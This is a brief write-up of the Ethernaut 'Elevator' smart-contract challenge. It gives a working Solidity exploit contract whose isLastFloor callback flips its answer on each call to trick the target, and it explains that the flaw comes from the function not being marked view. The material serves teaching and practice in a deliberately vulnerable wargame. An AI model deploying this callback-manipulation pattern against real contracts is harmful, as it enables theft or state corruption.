# [Elevator](https://ethernaut.openzeppelin.com/level/0xaB4F3F2644060b2D960b0d88F0a42d1D27484687)

In this level, we will write the `Builder` contract which the elevator interacts with. However, in the same transaction we will return opposite boolean results for `isLastFloor` function.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint _floor) external;    
}

contract Building {
  bool toggleMe = true;
  
  function isLastFloor(uint) external returns (bool) {
    toggleMe = !toggleMe;
    return toggleMe;
  }

  function callElevator(address _elevator) public {
    Elevator(_elevator).goTo(1);
  }

}
```

The problem here is that Elevator did not specify `isLastFloor` to be a `view` function, which would prevent us from modifying the state like this.